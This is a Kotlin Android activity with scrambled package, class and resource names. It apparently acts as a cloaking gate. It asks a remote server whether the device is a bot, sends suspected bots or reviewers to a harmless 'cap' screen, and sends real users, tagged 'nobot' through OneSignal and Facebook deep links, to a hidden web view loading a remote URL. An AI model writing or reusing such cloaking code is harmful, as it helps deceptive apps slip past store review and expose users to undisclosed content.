package com.frfefreiefdrrefdre.jfrdofrdkfrefrr.rvfendkjvbnkjefrnvkjfrednkvjrntkbvnkrtjnbtgr.vfdnkvbjnfdkjvnbkfvndkjvkrvjendkvjenkvfcnerv.sswxdpsxdlasxdsxsdch

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import com.frfefreiefdrrefdre.jfrdofrdkfrefrr.R
import com.frfefreiefdrrefdre.jfrdofrdkfrefrr.bgfkjmrktlfnvblkjernfkvjnrekjfvbhkrjfbvkjrfnked.gfblrntkjbnkvrtnbkjrtnfkbvjnerkjfvnerkjlnvclkerlds.MainActivity
import com.frfefreiefdrrefdre.jfrdofrdkfrefrr.rvfendkjvbnkjefrnvkjfrednkvjrntkbvnkrtjnbtgr.vfdnkvbjnfdkjvnbkfvndkjvkrvjendkvjenkvfcnerv.mdxscadcidxcxn.FvfjgvngrfvGhmyknhyju


class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
    private val spName: String = "CHECK"
    private val spStatus: String = "PASS"
    private val NOBOT_URL = "https://nobot"
    private val BOT_URL = "https://bot"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.vfimflvlkgfblvmgfrlkbmvfrt)

        sendGet1(getString(R.string.vfmjklfvg_vfv_Vfvfv_vffdnhynhy_jhynyyynyunuyyyn))
    }

    private fun sendGet(url: String, deepString: String = "") {
        Log.e("Sending url", url)
        val queue = Volley.newRequestQueue(this)
        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                Log.i("Response", response.toString())
            },
            { error ->
                when (error?.networkResponse?.headers?.get("location")) {
                    null -> {
                        Toast.makeText(this, "Connection Error!", Toast.LENGTH_LONG).show()
                        startCap()
                    }
                    BOT_URL -> startCap()
                    NOBOT_URL -> {
                        setCheckingState(true)
                        OneSignal.sendTag("nobot", "1")
                        startMain(deepString)
                    }
                }
            })

        queue.add(stringRequest)
    }

    private fun sendGet1(url: String) {
        Log.e("Sending url", url)
        val queue = Volley.newRequestQueue(this)
        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                if (response.toString() == "true") {
                    startCap()
                } else {
                    if (getCheckingState()) {
                        Log.e("already", "main")
                        startMain()
                    } else {
                        //onesignal init
                        OneSignal.startInit(this)
                            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                            .unsubscribeWhenNotificationsAreDisabled(true)
                            .init()

                        //fb init
                        FacebookSdk.setAutoInitEnabled(true)
                        FacebookSdk.fullyInitialize()
                        AppLinkData.fetchDeferredAppLinkData(
                            this
                        ) {
                            if (it == null) {
                                sendGet(getString(R.string.refhjvfjvj_gbvmgkbtrg))
                            } else {
                                val deepData = it.targetUri
                                sendGet(
                                    getString(R.string.refhjvfjvj_gbvmgkbtrg),
                                    deepData?.query.toString()
                                )
                            }
                        }
                    }
                }
                Log.i("Response", response.toString())
            },
            {
                Toast.makeText(this, "Connection Error!", Toast.LENGTH_LONG).show()
                startCap()
            })

        queue.add(stringRequest)
    }

    private fun getBundle(): String {
        return this.packageName
    }

    private fun formUrl(deepString: String): String {
        var url = getString(R.string.vfrjkfv_Vfttvbg_gbfrt_vbrtgvb)
        url += "?source=${getBundle()}"

        if (deepString != "") {
            url += "&$deepString"
        }
        Log.e("Url", url)
        return url
    }

    private fun startMain(deepString: String = "") {
        val intent = Intent(this, FvfjgvngrfvGhmyknhyju::class.java)
        intent.putExtra("url", formUrl(deepString))
        startActivity(intent)
        finish()
    }

    private fun startCap() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun setCheckingState(status: Boolean) {
        val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
        val editor = sp.edit()
        editor.putBoolean(spStatus, status)
        editor.apply()
    }

    private fun getCheckingState(): Boolean {
        val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
        return sp.getBoolean(spStatus, false)
    }
}